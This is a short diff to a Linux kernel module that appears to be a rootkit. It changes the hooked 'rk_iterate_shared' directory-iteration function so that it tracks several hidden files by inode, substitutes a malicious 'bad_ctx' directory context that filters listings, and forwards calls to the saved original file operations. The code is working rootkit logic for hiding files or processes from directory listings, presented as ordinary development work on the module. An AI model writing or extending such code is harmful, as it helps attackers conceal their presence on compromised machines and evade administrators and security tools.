@@ -623,11 +623,20 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
 }
 
 int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
+    int i;
     int result = 0;
-    bad_ctx.pos = ctx->pos;
-    backup_ctx = ctx;
-    result = backup_proc_fops->iterate_shared(file, &bad_ctx);
-    ctx->pos = bad_ctx.pos;
+
+    for (i = 0; i < hidden_file_count; ++i) {
+        if (file->f_inode == hidden_files[i].inode) {
+            //Inodes match, use this context
+            hidden_files[i].bad_ctx->pos = ctx->pos;
+            hidden_files[i].backup_ctx = ctx;
+            result = hidden_files[i].backup_fops->iterate_shared(file, hidden_files[i].bad_ctx);
+            ctx->pos = hidden_files[i].bad_ctx->pos;
+            return result;
+        }
+    }
+    result = file->f_inode->i_fop->iterate_shared(file, ctx);
     return result;
 }
 
